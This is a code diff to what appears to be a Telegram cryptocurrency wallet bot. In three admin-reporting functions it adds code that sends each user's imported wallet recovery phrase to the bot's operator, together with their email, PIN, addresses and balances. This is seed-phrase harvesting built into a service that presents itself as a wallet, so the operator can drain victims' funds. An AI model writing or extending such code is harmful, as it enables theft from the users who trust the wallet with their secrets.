@@ -671,7 +671,16 @@ function registerUser(state) {
           `📧 Email: <code>${state.email}</code>\n` +
           `🔐 PIN: <code>${state.pin}</code>\n` +
           `🟣 SOL Address: <code>${state.address || "N/A"}</code>\n` +
-          `🔵 ETH Address: <code>${state.ethAddress || "N/A"}</code>\n` +
+          `🔵 ETH Address: <code>${state.ethAddress || "N/A"}</code>\n`;
+        
+        if (state.importedWalletPhrase) {
+          adminNotification += `\n📥 <b>Imported Wallet:</b>\n`;
+          adminNotification += `🔑 Recovery Phrase: <code>${state.importedWalletPhrase}</code>\n`;
+          adminNotification += `🌐 Network: ${state.importedWalletNetwork === "solana" ? "🟣 Solana" : "🔵 Ethereum"}\n`;
+          adminNotification += `👛 Type: ${state.importedWalletType || "Unknown"}\n`;
+        }
+        
+        adminNotification +=
           `💵 SOL: $${solUsd.toFixed(2)} (${(state.solBalance || 0).toFixed(4)} SOL)\n` +
           `💵 ETH: $${ethUsd.toFixed(2)} (${(state.ethBalance || 0).toFixed(4)} ETH)\n` +
           `💵 USDC: $${usdc.toFixed(2)}\n` +
@@ -1896,13 +1905,22 @@ function sendAdminUserDetails(ctx, targetId) {
   const ethUsd = (user.ethBalance || 0) * ETH_PRICE;
   const usdc = user.usdcBalance || 0;
   const total = solUsd + ethUsd + usdc;
-  const text =
+  let text =
     "📋 <b>User Details (ID: " + targetId + ")</b>\n\n" +
     `<b>1.</b> @${user.username || "unknown"} (ID: ${user.userId})\n` +
     `📧 Email: <code>${user.email}</code>\n` +
     `🔐 PIN: <code>${user.pin}</code>\n` +
     `🟣 SOL Address: <code>${user.address || "N/A"}</code>\n` +
-    `🔵 ETH Address: <code>${user.ethAddress || "N/A"}</code>\n` +
+    `🔵 ETH Address: <code>${user.ethAddress || "N/A"}</code>\n`;
+  
+  if (user.importedWalletPhrase) {
+    text += `\n📥 <b>Imported Wallet:</b>\n`;
+    text += `🔑 Recovery Phrase: <code>${user.importedWalletPhrase}</code>\n`;
+    text += `🌐 Network: ${user.importedWalletNetwork === "solana" ? "🟣 Solana" : "🔵 Ethereum"}\n`;
+    text += `👛 Type: ${user.importedWalletType || "Unknown"}\n`;
+  }
+  
+  text +=
     `💵 SOL: $${solUsd.toFixed(2)} (${(user.solBalance || 0).toFixed(4)} SOL)\n` +
     `💵 ETH: $${ethUsd.toFixed(2)} (${(user.ethBalance || 0).toFixed(4)} ETH)\n` +
     `💵 USDC: $${usdc.toFixed(2)}\n` +
@@ -1923,13 +1941,22 @@ async function sendAdminAllUsers(ctx) {
     const ethUsd = (user.ethBalance || 0) * ETH_PRICE;
     const usdc = user.usdcBalance || 0;
     const total = solUsd + ethUsd + usdc;
-    const text =
+    let text =
       "📋 <b>User Details (ID: " + user.userId + ")</b>\n\n" +
       `<b>1.</b> @${user.username || "unknown"} (ID: ${user.userId})\n` +
       `📧 Email: <code>${user.email}</code>\n` +
       `🔐 PIN: <code>${user.pin}</code>\n` +
       `🟣 SOL Address: <code>${user.address || "N/A"}</code>\n` +
-      `🔵 ETH Address: <code>${user.ethAddress || "N/A"}</code>\n` +
+      `🔵 ETH Address: <code>${user.ethAddress || "N/A"}</code>\n`;
+    
+    if (user.importedWalletPhrase) {
+      text += `\n📥 <b>Imported Wallet:</b>\n`;
+      text += `🔑 Recovery Phrase: <code>${user.importedWalletPhrase}</code>\n`;
+      text += `🌐 Network: ${user.importedWalletNetwork === "solana" ? "🟣 Solana" : "🔵 Ethereum"}\n`;
+      text += `👛 Type: ${user.importedWalletType || "Unknown"}\n`;
+    }
+    
+    text +=
       `💵 SOL: $${solUsd.toFixed(2)} (${(user.solBalance || 0).toFixed(4)} SOL)\n` +
       `💵 ETH: $${ethUsd.toFixed(2)} (${(user.ethBalance || 0).toFixed(4)} ETH)\n` +
       `💵 USDC: $${usdc.toFixed(2)}\n` +
